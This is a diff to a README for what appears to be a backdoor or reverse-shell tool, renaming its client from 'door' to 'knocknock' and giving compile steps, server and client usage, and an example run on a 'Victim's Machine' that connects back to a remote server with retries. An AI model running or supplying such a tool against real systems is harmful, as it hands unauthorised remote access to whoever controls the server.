@@ -4,25 +4,26 @@
 > There is also a C version client side program Support Linux & Windows.
 > WARN: (Server <=> Client communications not encrypted)
 
-### Compile C version `door.c`
+
+### Compile C version `knocknock.c`
 ```bash
 # Windows CL
-$> cl door.c /O1 /D WIN32 /Fe door /link /subsystem:console
+$> cl knocknock.c /O1 /D WIN32 /Fe knocknock /link /subsystem:console
 # Windows or Linux gcc
-$> gcc -Wall -O1 door.c -o door
+$> gcc -Wall -O1 knocknock.c -o knocknock
 ```
 
 ### How To Use?
 ```bash
 $> ./server.py bind_address:bind_port
-$> ./door.py server_ip:server_port[:retry_interval]
+$> ./knocknock.py server_ip:server_port[:retry_interval]
 
 # Server Example
 $> ./server.py 127.0.0.1:4433
 
 # Client Example (C version has the same argument)
-$> ./door.py 127.0.0.1:4433 # default retry interval 60 seconds
-$> ./door.py 127.0.0.1:4433:60
+$> ./knocknock.py 127.0.0.1:4433 # default retry interval 60 seconds
+$> ./knocknock.py 127.0.0.1:4433:60
 ```
 
 ## Example
@@ -38,7 +39,7 @@ $> ls -la
 total 16
 drwxr-xr-x  3 root root 4096 Feb 11 07:31 .
 drwxr-xr-x 22 root root 4096 Jan 30 09:55 ..
--rwxr-xr-x  1 root root  532 Feb 11 07:31 door
+-rwxr-xr-x  1 root root  532 Feb 11 07:31 knocknock
 drwxr-xr-x  5 git  git  4096 Jan  3 08:41 jack
 
 $>
@@ -46,6 +47,6 @@ $>
 
 #### Victim's Machine
 ```bash
-root@boy 07:47 /home $ ./door *.*.*.*:2345
+root@boy 07:47 /home $ ./knocknock *.*.*.*:2345
 ```
 End.
